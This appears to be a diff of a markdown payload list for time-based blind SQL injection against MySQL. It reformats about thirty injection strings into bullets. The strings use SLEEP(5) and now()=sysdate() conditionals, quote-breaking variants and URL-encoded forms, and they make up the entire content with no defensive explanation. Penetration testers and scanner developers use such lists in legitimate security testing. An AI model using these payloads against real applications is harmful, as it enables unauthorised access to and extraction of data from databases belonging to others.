@@ -1,35 +1,33 @@
 #### MySQL Blind (Time Based) Payload list:
 
-0'XOR(if(now()=sysdate(), sleep (5),0)) XOR'Z
-0'XOR(if(now()=sysdate(), sleep(5*1),0))XOR'Z
-if(now()=sysdate(), sleep (5),0)
-'XOR(if(now()=sysdate(), sleep(5),0))XOR'
-'XOR(if(now()=sysdate(), sleep(5*1),0))OR'
-if(now()=sysdate(), sleep (5),0)/"XOR(if (now()=sysdate(), sleep(5),0))OR"/
-if(now()=sysdate(), sleep (5),0)/*'XOR(if(now()=sysdate(), sleep(5),0))OR' "XO
-R(if(now()=sysdate(), sleep (5),0))OR"*/
-if(now()=sysdate(), sleep(5),0)/'XOR(if (now()=sysdate(),sleep(5),0))OR' "XOR
-(if(now()=sysdate(), sleep (5),0) and 5=5)"/
-SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/
-%2c(select%5+%5from%5(select(sleep(5)))a)
-(select(0)from(select(sleep(5)))v)
-(SELECT SLEEP(5))
-'%2b(select*from(select(sleep(5)))a)%2b'
-(select*from(select(sleep(5)))a)
-1'%2b(select*from(select(sleep(5)))a)%2b'
-(select * from (select(sleep(5)))a)
-desc%2c(select*from(select(sleep (5)))a)
--1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))Α))
-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A)) - (SELECT * FROM (SELECT(SLEEP(5)))YYYY)
-(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#
-(SELECT * FROM (SELECT(SLEEP(5)))YYYY) --
-'+(select*from(select(sleep(5)))a)+'
-select(0)from(select(sleep(5)))v)%2f'+ (
-(select(0)from(select(sleep(5)))v)+'"
-(select(0)from(select(sleep(5)))v)%2f*'+
-(select(0)from(select(sleep(5)))v)+'"+
-(select(0)from(select(sleep(5)))v)+"*%2f
-(select(0)from(select(sleep(5)))v)/*'+
-(select(0)from(select(sleep(5)))v)+'"+
-(select(0)from(select(sleep(5)))v)+"*/
-',''), /*test*/%26%26%09sLeEp(5)%09--+
+- 0'XOR(if(now()=sysdate(), sleep (5),0)) XOR'Z
+- 0'XOR(if(now()=sysdate(), sleep(5*1),0))XOR'Z
+- if(now()=sysdate(), sleep (5),0)
+- 'XOR(if(now()=sysdate(), sleep(5),0))XOR'
+- 'XOR(if(now()=sysdate(), sleep(5*1),0))OR'
+- if(now()=sysdate(), sleep (5),0)/"XOR(if (now()=sysdate(), sleep(5),0))OR"/
+- if(now()=sysdate(), sleep (5),0)/*'XOR(if(now()=sysdate(), sleep(5),0))OR' "XOR(if(now()=sysdate(), sleep (5),0))OR"*/
+- if(now()=sysdate(), sleep(5),0)/'XOR(if (now()=sysdate(),sleep(5),0))OR' "XOR(if(now()=sysdate(), sleep (5),0) and 5=5)"/
+- SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/
+- %2c(select%5+%5from%5(select(sleep(5)))a)
+- (select(0)from(select(sleep(5)))v)
+- (SELECT SLEEP(5))
+- '%2b(select*from(select(sleep(5)))a)%2b'
+- (select*from(select(sleep(5)))a)
+- 1'%2b(select*from(select(sleep(5)))a)%2b'
+- (select * from (select(sleep(5)))a)
+- desc%2c(select*from(select(sleep (5)))a)
+- -1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))Α))
+- 1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A)) - (SELECT * FROM (SELECT(SLEEP(5)))YYYY)
+- (SELECT * FROM (SELECT(SLEEP(5)))YYYY)#
+- (SELECT * FROM (SELECT(SLEEP(5)))YYYY) --
+- '+(select*from(select(sleep(5)))a)+'
+- select(0)from(select(sleep(5)))v)%2f'+ (
+- (select(0)from(select(sleep(5)))v)+'"
+- (select(0)from(select(sleep(5)))v)%2f*'+
+- (select(0)from(select(sleep(5)))v)+'"+
+- (select(0)from(select(sleep(5)))v)+"*%2f
+- (select(0)from(select(sleep(5)))v)/*'+
+- (select(0)from(select(sleep(5)))v)+'"+
+- (select(0)from(select(sleep(5)))v)+"*/
+- ',''), /*test*/%26%26%09sLeEp(5)%09--+
